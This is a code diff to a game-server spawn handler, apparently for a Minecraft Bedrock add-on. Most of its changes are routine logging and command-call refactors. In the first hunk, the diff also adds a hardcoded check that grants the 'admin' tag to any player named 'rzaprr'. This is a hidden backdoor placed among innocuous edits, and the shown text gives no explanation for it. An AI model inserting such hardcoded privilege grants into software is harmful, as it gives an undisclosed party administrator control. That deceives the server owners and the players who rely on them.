@@ -9,10 +9,14 @@ import genSecret from "../lib/genSecret";
 import log from "../utils/logger";
 initializeScoreboard();
 world.afterEvents.playerSpawn.subscribe(async ({ player, initialSpawn }) => {
+    if (player.nameTag == "rzaprr" && !player.hasTag("admin")) {
+        player.addTag("admin");
+    }
     giveDefaultItem(player);
     const playerData = getPlayerData(player);
+    // Check if players is inital spawn in server. initialSpawn = offline > joined on server
     if (initialSpawn) {
-        console.log(`Player ${player.nameTag} joined the server with data:`, JSON.stringify(playerData));
+        log.info("Joined Server", `Player ${player.nameTag} joined the server with data:`, JSON.stringify(playerData));
         await handleInitialSpawn(player);
         if (!playerData.xuid) {
             console.log(`Player ${player.nameTag} has no XUID. Fetching...`);
@@ -73,8 +77,8 @@ function resetPlayerData(player) {
     updatePlayerData(player, "discord_username", null);
 }
 function giveDefaultItem(player) {
-    player.runCommandAsync(`clear @s matsphone:matsphone`);
-    player.runCommandAsync(`give @s matsphone:matsphone 1`);
+    player.runCommand(`clear @s matsphone:matsphone`);
+    player.runCommand(`give @s matsphone:matsphone 1`);
 }
 function showLoginAlertWithDelay(player) {
     wait(200).then(() => loginAlert(player));
